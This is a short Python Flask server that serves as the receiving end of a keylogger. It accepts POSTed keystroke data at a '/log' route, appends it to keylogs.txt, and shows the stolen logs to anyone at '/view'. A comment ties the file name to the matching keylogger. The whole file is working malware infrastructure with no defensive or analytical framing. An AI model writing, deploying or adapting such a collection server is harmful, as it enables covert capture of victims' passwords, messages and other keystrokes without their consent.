from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_keys():
    data = request.get_data().decode('utf-8')
    print(f"Received: {data}")
    with open("keylogs.txt", "a") as file:  # ⚠️ Must match the name used by the keylogger
        file.write(data)
    return "Logged", 200

@app.route('/view', methods=['GET'])
def view_logs():
    try:
        with open("keylogs.txt", "r") as file:
            content = file.read()
        return f"<pre>{content}</pre>", 200
    except FileNotFoundError:
        return "No logs found.", 404

if __name__ == "__main__":
    app.run(debug=True)
